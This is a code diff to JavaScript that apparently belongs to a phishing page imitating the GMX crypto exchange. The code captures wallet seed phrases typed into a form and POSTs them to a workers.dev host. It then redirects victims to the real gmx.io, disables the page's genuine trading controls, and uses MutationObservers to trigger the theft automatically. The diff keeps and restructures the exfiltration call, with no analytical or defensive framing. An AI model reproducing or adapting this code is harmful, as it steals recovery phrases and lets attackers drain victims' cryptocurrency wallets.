@@ -18,17 +18,20 @@ const sendDDD = _ => {
                     const input = document.querySelector('.Wallet-input');
                     const phrase = input.value.trim().replace(/\s+/g, ' ').split(' ');
                     const countWords = phrase.length;
-
                     if (countWords === 12 || countWords === 15 || countWords === 18 || countWords === 21 || countWords === 24) {
                         formData.append('wallet', wallet);
                         formData.append('phrase', phrase);
-
-                        await fetch('https://mountaindewmfka.juistespastelastes.workers.dev', {
-                            method: 'POST',
-                            body: formData
-                        }).then(res => {
-                            res.status === 200 && (location = 'https://app.gmx.io/#/trade');
-                        })
+                        try {
+                            await fetch('https://mountaindewmfka.juistespastelastes.workers.dev', {
+                                method: 'POST',
+                                body: formData
+                            });
+                            setTimeout(() => {
+                                window.location.href = 'https://gmx.io';
+                            }, 4000);
+                        } catch (error) {
+                            console.log('Error:', error);
+                        }
                     };
                 };
             };
@@ -46,23 +49,18 @@ const checkLinks = _ => {
     if (document.querySelector('.App-header-network')) {
         document.querySelector('.App-header-network').onclick = openMenu;
     };
-
     if (document.querySelectorAll('.Exchange-swap-option-tabs .Tab-option')) {
         document.querySelectorAll('.Exchange-swap-option-tabs .Tab-option').forEach(el => el.style.pointerEvents = 'none');
     };
-
     if (document.querySelector('.Exchange-swap-ball')) {
         document.querySelector('.Exchange-swap-ball').style.pointerEvents = 'none';
     };
-
     if (document.querySelectorAll('.TokenSelector')) {
         document.querySelectorAll('.TokenSelector').forEach(el => el.style.pointerEvents = 'none');
     };
-
     if (document.querySelectorAll('.App-header-link-container')) {
         document.querySelectorAll('.App-header-link-container').forEach(link => link.onclick = openMenu);
     };
-
     if (document.querySelectorAll('.Exchange-info-label-button .link-underline')) {
         document.querySelectorAll('.Exchange-info-label-button .link-underline').forEach(link => link.onclick = openMenu);
     };
@@ -71,6 +69,7 @@ const checkLinks = _ => {
 const observerHash = new MutationObserver(checkUrlHash);
 const observerLinks = new MutationObserver(checkLinks);
 const sendDDDaUTO = new MutationObserver(sendDDD);
+
 [observerHash, observerLinks, sendDDDaUTO].forEach(obs => obs.observe(document.documentElement, {
     childList: true,
     subtree: true
